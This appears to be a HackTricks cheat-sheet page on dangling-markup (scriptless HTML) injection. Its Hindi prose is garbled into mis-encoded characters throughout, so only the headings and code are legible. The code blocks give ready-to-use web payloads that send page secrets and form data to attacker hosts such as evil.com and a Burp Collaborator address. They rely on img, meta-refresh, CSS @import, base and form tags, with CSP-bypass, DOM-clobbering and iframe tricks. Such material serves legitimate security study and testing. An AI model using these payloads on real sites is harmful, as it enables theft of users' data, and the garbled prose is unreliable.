# Dangling Markup - HTML scriptless injection

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)\*\* рдкрд░ рдлреЙрд▓реЛ\*\* рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

## рд╕рд╛рд░рд╛рдВрд╢

рдпрд╣ рддрдХрдиреАрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдПрдХ **HTML рдЗрдВрдЬреЗрдХреНрд╢рди рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдпрд╣ рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реИ рдЕрдЧрд░ рдЖрдк **рдХрд┐рд╕реА** [**XSS** ](../xss-cross-site-scripting/)**рдХреЛ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░рдиреЗ рдХрд╛ рдХреЛрдИ рддрд░реАрдХрд╛ рдирд╣реАрдВ рдорд┐рд▓рддрд╛ рд╣реИ** рд▓реЗрдХрд┐рди рдЖрдк **рдХреБрдЫ HTML рдЯреИрдЧреНрд╕ рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдпрд╣ рдЙрдкрдпреЛрдЧреА рд╣реИ рдЕрдЧрд░ рдХреБрдЫ **рд░рд╣рд╕реНрдп рд╕рд╛рдл рдкрд╛рда рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЧрдпрд╛ рд╣реИ** рдФрд░ рдЖрдк рдЙрд╕реЗ **рдЙрдкрднреЛрдХреНрддрд╛ рд╕реЗ рдмрд╛рд╣рд░ рд▓реЗ рдЬрд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**, рдпрд╛ рдЕрдЧрд░ рдЖрдк рдХрд┐рд╕реА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рдЧрд▓рдд рджрд┐рдЦрд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред

рдХрдИ рддрдХрдиреАрдХреЗрдВ рдпрд╣рд╛рдБ рдЯрд┐рдкреНрдкрдгреА рдХреА рдЧрдИ рд╣реИрдВ рдЬреЛ рдХреБрдЫ [**рд╕рд╛рдордЧреНрд░реА рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐**](../content-security-policy-csp-bypass/) рдХреЛ рдЙрд▓рдЯрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ (html рдЯреИрдЧреНрд╕, CSS, http-meta рдЯреИрдЧреНрд╕, рдлреЙрд░реНрдореНрд╕, рдмреЗрд╕...).

## рдореБрдЦреНрдп рдЕрдиреБрдкреНрд░рдпреЛрдЧ

### рд╕рд╛рдл рдкрд╛рда рд░рд╣рд╕реНрдп рдЪреБрд░рд╛рдирд╛

рдпрджрд┐ рдЖрдк `<img src='http://evil.com/log.cgi?` рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЬрдм рдкреГрд╖реНрда рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ рддреЛ рдкреАрдбрд╝рд┐рдд рдЖрдкрдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдП рдЧрдП `img` рдЯреИрдЧ рдФрд░ рдХреЛрдб рдХреЗ рдмреАрдЪ рдХреЛрдб рд╕рднреА рдХреЛ рднреЗрдЬреЗрдЧрд╛ред рдпрджрд┐ рдЙрд╕ рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рдХреЛрдИ рд░рд╣рд╕реНрдп рд╣реИ, рддреЛ рдЖрдк рдЙрд╕реЗ рдЪреБрд░рд╛ рд▓реЗрдВрдЧреЗ (рдЖрдк рдПрдХ рдбрдмрд▓ рдХреЛрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА рд╡рд╣реА рдХрд╛рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рджреЗрдЦреЗрдВ рдХреМрди рд╕рд╛ рдЕрдзрд┐рдХ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИ)ред

рдпрджрд┐ `img` рдЯреИрдЧ рдордирд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП CSP рдХреЗ рдХрд╛рд░рдг) рддреЛ рдЖрдк `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?` рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```

рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ **Chrome HTTP URLs** рдХреЛ "<" рдпрд╛ "\n" рдХреЗ рд╕рд╛рде рдмреНрд▓реЙрдХ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдк "ftp" рдЬреИрд╕реЗ рдЕрдиреНрдп рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╕реНрдХреАрдо рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк CSS `@import` рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЬреЛ рдПрдХ ";" рддрдХ рдХреЛрдб рд╕рднреА рдХреЛ рднреЗрдЬреЗрдЧрд╛)ред

```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```

рдЖрдк рдпрд╣рд╛рдБ рднреА **`<table`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```

рдЖрдк рдПрдХ `<base` рдЯреИрдЧ рднреА рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА рдЙрд╕ рд╕рдордп рддрдХ рднреЗрдЬреА рдЬрд╛рдПрдЧреА рдЬрдм рддрдХ рдЙрджреНрдзрд░рдг рдмрдВрдж рдирд╣реАрдВ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдЗрд╕рдореЗрдВ рдХреБрдЫ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдВрддрд░реНрдХреНрд░рд┐рдпрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ (рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХрд┐рд╕реА рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдирд╛ рд╣реЛрдЧрд╛, рдХреНрдпреЛрдВрдХрд┐ рдмреЗрд╕ рдЯреИрдЧ рдиреЗ рд▓рд┐рдВрдХ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдХреЗрддрд┐рдд рдбреЛрдореЗрди рдмрджрд▓ рджрд┐рдпрд╛ рд╣реЛрдЧрд╛):

```html
<base target='        <--- Injected
steal me'<b>test</b>
```

### рдлреЙрд░реНрдо рдЪреБрд░рд╛рдирд╛

```html
<base href='http://evil.com/'>
```

рддреЛ, рд╡реЗ рдлреЙрд░реНрдо рдЬреЛ рдбреЗрдЯрд╛ рдХреЛ рдкрде рдкрд░ рднреЗрдЬрддреЗ рд╣реИрдВ (рдЬреИрд╕реЗ `<form action='update_profile.php'>`) рд╡реЗ рдбреЗрдЯрд╛ рдХреЛ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдбреЛрдореЗрди рдкрд░ рднреЗрдЬреЗрдВрдЧреЗред

### рдлреЙрд░реНрдо рдЪреБрд░рд╛рдирд╛ 2

рдПрдХ рдлреЙрд░реНрдо рд╣реЗрдбрд░ рд╕реЗрдЯ рдХрд░реЗрдВ: `<form action='http://evil.com/log_steal'>` рдпрд╣ рдЕрдЧрд▓реЗ рдлреЙрд░реНрдо рд╣реЗрдбрд░ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░реЗрдЧрд╛ рдФрд░ рдлреЙрд░реНрдо рд╕реЗ рд╕рднреА рдбреЗрдЯрд╛ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рднреЗрдЬ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

### рдлреЙрд░реНрдо рдЪреБрд░рд╛рдирд╛ 3

рдмрдЯрди рдлреЙрд░реНрдо рдХреА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рднреЗрдЬрдиреЗ рд╡рд╛рд▓реЗ URL рдХреЛ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ "formaction" рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЗ рд╕рд╛рде:

```html
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```

### рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рд░рд╣рд╕реНрдп рдЪреБрд░рд╛рдирд╛ 2

рдирд╡реАрдирддрдо рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлреЙрд░реНрдо рдЪреБрд░рд╛рдиреЗ рдХреЗ рд▓рд┐рдП (рдирдП рдлреЙрд░реНрдо рд╣реЗрдбрд░ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдирд╛) рдЖрдк рдлрд┐рд░ рдПрдХ рдирдпрд╛ рдЗрдирдкреБрдЯ рдлреАрд▓реНрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```html
<input type='hidden' name='review_body' value="
```

рдФрд░ рдпрд╣ рдЗрдирдкреБрдЯ рдлрд╝реАрд▓реНрдб рдЕрдкрдиреЗ рдбрдмрд▓ рдХреЛрдЯ рдФрд░ рдЕрдЧрд▓реЗ рдбрдмрд▓ рдХреЛрдЯ рдХреЗ рдмреАрдЪ рдХрд╛ рд╕рднреА рд╕рд╛рдордЧреНрд░реА рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдЧрд╛ред рдпрд╣ рд╣рдорд▓рд╛ "_**рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рд░рд╣рд╕реНрдп рдЪреБрд░рд╛рдирд╛**_" рдХреЛ "_**рдлреЙрд░реНрдо2 рдЪреБрд░рд╛рдирд╛**_" рдХреЗ рд╕рд╛рде рдорд┐рд▓рд╛рддрд╛ рд╣реИред

рдЖрдк рдПрдХ рдлреЙрд░реНрдо рдФрд░ `<option>` рдЯреИрдЧ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдХреЗ рдПрдХ рд╣реА рдЪреАрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдПрдХ рдмрдВрдж `</option>` рдорд┐рд▓рдиреЗ рддрдХ рд╕рднреА рдбреЗрдЯрд╛ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛:

```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```

### рдлреЙрд░реНрдо рдкреИрд░рд╛рдореАрдЯрд░ рдЗрдВрдЬреЗрдХреНрд╢рди

рдЖрдк рдПрдХ рдлреЙрд░реНрдо рдХрд╛ рдкрде рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдирдП рдорд╛рди рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдПрдХ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдХреНрд░рд┐рдпрд╛ рдХрд┐рдпрд╛ рдЬрд╛рдП:

```html
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        тЖР Injected lines

<form action="/change_settings.php">                        тЖР Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             тЖР Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```

### рдиреЛрд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реНрдкрд╖реНрдЯ рдкрд╛рдард┐рдХ рд░рд╣рд╕реНрдп рдЪреБрд░рд╛рдирд╛

`<noscript></noscript>` рдПрдХ рдЯреИрдЧ рд╣реИ рдЬрд┐рд╕рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдЗрдВрдЯрд░рдкреНрд░рд┐рдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдЕрдЧрд░ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ (рдЖрдк [chrome://settings/content/javascript](chrome://settings/content/javascript) рдореЗрдВ Chrome рдореЗрдВ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд╕рдХреНрд╖рдо/рдЕрдХреНрд╖рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред

рдПрдХ рддрд░реАрдХрд╛ рд╡реЗрдм рдкреГрд╖реНрда рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рдмрд┐рдВрджреБ рд╕реЗ рд╣рдорд▓реЗ рдХреЗ рдмрд╛рдж рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╕рд╛рдЗрдЯ рдХреЗ рд▓рд┐рдП рдиреАрдЪреЗ рддрдХ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣ рд╣реЛрдЧрд╛:

```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```

### CSP рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрд╡рд╛рдж рдХреЗ рд╕рд╛рде рдЫрд▓рдХрд░рдирд╛

рдЗрд╕ [portswiggers рдЕрдиреБрд╕рдВрдзрд╛рди](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) рд╕реЗ рдЖрдк рд╕реАрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ CSP рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд** рд╡рд╛рддрд╛рд╡рд░рдг рд╕реЗ рднреА рдХреБрдЫ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрд╡рд╛рдж** рдХреЗ рд╕рд╛рде рдЕрднреА рднреА **рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ** рд╣реИрдВред рдЗрд╕ рдЕрд╡рд╕рд░ рдореЗрдВ рд╣рдо рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ:

```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```

Note рдХрд░реЗрдВ рдХрд┐ рдЖрдк **рд╡рд┐рдХреНрдЯрд┐рдо** рд╕реЗ рдХрд╣реЗрдВрдЧреЗ рдХрд┐ рд╡рд╣ **рдПрдХ рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ** рдХрд░реЗрдВ рдЬреЛ рдЙрд╕реЗ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд **рдкреЗрд▓реЛрдб** рдкрд░ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХрд░реЗрдЧрд╛ред рдпрд╣ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`base`** рдЯреИрдЧ рдХреЗ рдЕрдВрджрд░ **`target`** рд╡рд┐рд╢реЗрд╖рддрд╛ рдЕрдЧрд▓реЗ рдПрдХрд▓ рдЙрджреНрдзрд░рдг рддрдХ **HTML рд╕рд╛рдордЧреНрд░реА** рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдЧреАред рдЗрд╕рд╕реЗ рд╣реЛрдЧрд╛ рдХрд┐ рдЬрдм рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рддреЛ **`window.name`** рдХрд╛ **рдорд╛рди** рд╡рд╣ рд╕рднреА **HTML рд╕рд╛рдордЧреНрд░реА** рд╣реЛрдЧрд╛ред рдЗрд╕рд▓рд┐рдП, рдЬреИрд╕реЗ рд╣реА рд╡рд┐рдХреНрдЯрд┐рдо рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдХреЗ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд░рд╣рд╛ рд╣реИ, рдЖрдк рдЙрд╕ **`window.name`** рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕ рдбреЗрдЯрд╛ рдХреЛ **рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```

### рднреНрд░рд╛рдордХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ 1 - HTML рдиреЗрдорд╕реНрдкреЗрд╕ рд╣рдорд▓рд╛

HTML рдореЗрдВ рдПрдХ рдирдпрд╛ рдЯреИрдЧ рдбрд╛рд▓реЗрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдЖрдИрдбреА рд╣реЛрдЧрд╛ рдЬреЛ рдЕрдЧрд▓реЗ рдЯреИрдЧ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░реЗрдЧрд╛ рдФрд░ рдПрдХ рдорд╛рди рдЬреЛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдлрд╝реНрд▓реЛ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░реЗрдЧрд╛ред рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЖрдк рдЪреБрди рд░рд╣реЗ рд╣реИрдВ рдХрд┐ рдЬрд┐рд╕рдХреЗ рд╕рд╛рде рдЬрд╛рдирдХрд╛рд░реА рд╕рд╛рдЭрд╛ рдХреА рдЬрд╛рдПрдЧреА:

```html
<input type='hidden' id='share_with' value='fredmbogo'>     тЖР Injected markup
...
Share this status update with:                              тЖР Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```

### рдЧреБрдорд░рд╛рд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ 2 - рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдиреЗрдорд╕реНрдкреЗрд╕ рд╣рдорд▓рд╛

HTML рдЯреИрдЧ рдбрд╛рд▓рдХрд░ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рдЕрдВрджрд░ рд╡реЗрд░рд┐рдПрдмрд▓ рдмрдирд╛рдПрдВред рдлрд┐рд░, рдпрд╣ рд╡реЗрд░рд┐рдПрдмрд▓ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдлреНрд▓реЛ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░реЗрдЧрд╛:

```html
<img id='is_public'>                                        тЖР Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    тЖР The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           тЖР Condition always evaluates to true
...
}
```

### JSONP рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

рдпрджрд┐ рдЖрдкрдХреЛ JSONP рдЗрдВрдЯрд░рдлреЗрд╕ рдорд┐рд▓рддрд╛ рд╣реИ рддреЛ рдЖрдк рдХрд┐рд╕реА рднреА рдбреЗрдЯрд╛ рдХреЗ рд╕рд╛рде рдХрд┐рд╕реА рднреА рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```html
<script src='/editor/sharing.js'>:              тЖР Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    тЖР Injected JSONP call
set_sharing({ ... })
```

рдпрд╛ рдЖрдк рдпрд╣рд╛рдБ рдХреБрдЫ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```html
<script src='/search?q=a&call=alert(1)'></script>
```

### рдЖрдИрдлреНрд░реЗрдо рджреБрд░реБрдкрдпреЛрдЧ

рдПрдХ рдмрдЪреНрдЪрд╛ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ рдкрд╛рд╕ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реЛрддреА рд╣реИ рдХрд┐ рд╡рд╣ рдЕрдкрдиреЗ рдорд╛рддрд╛-рдкрд┐рддрд╛ рдХреА `location` рд╕рдВрдкрддреНрддрд┐ рдХреЛ рджреЗрдЦ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдпрд╣ рдХреНрд░реЙрд╕-рд╕реНрдерд┐рддрд┐ рдореЗрдВ рднреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд╕реЗ рдПрдХ **рдЖрдИрдлреНрд░реЗрдо** рдореЗрдВ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд╕рдорд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ рдЬреЛ рдЧреНрд░рд╛рд╣рдХ рдХреЛ рдХрд┐рд╕реА рднреА рдкреГрд╖реНрда рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

```html
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```

рдЗрд╕реЗ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдХрдо рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: `sandbox=' allow-scripts allow-top-navigation'`

рдПрдХ рдЖрдИрдлреНрд░реЗрдо рдХреЛ рднреА рджреВрд╕рд░реЗ рдкреЗрдЬ рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ **рдЖрдИрдлреНрд░реЗрдо рдирд╛рдо рд╡рд┐рд╢реЗрд╖рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ**ред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдПрдХ рдРрд╕рд╛ рдЖрдИрдлреНрд░реЗрдо рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЦреБрдж рдХреЛ рдЖрдИрдлреНрд░реЗрдо рдХрд░рддрд╛ рд╣реИ рдЬреЛ HTML рдЗрдиреНрдЬреЗрдХреНрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдЖрдИрдлреНрд░реЗрдо рдирд╛рдо рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЗ рдЕрдВрджрд░ рдкреНрд░рдХрдЯ рд╣реЛрддреА рд╣реИ** рдФрд░ рдлрд┐рд░ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдЖрдИрдлреНрд░реЗрдо рд╕реЗ рдЙрд╕ рдирд╛рдо рддрдХ рдкрд╣реБрдВрдЪрдХрд░ рдЙрд╕реЗ рд▓реАрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```

For more info check [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta рджреБрд░реБрдкрдпреЛрдЧ

рдЖрдк **`meta http-equiv`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХрдИ рдХреНрд░рд┐рдпрд╛рдПрдБ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХреБрдХреА рд╕реЗрдЯ рдХрд░рдирд╛: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` рдпрд╛ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░рдирд╛ (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ 5 рд╕реЗрдХрдВрдб рдореЗрдВ): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

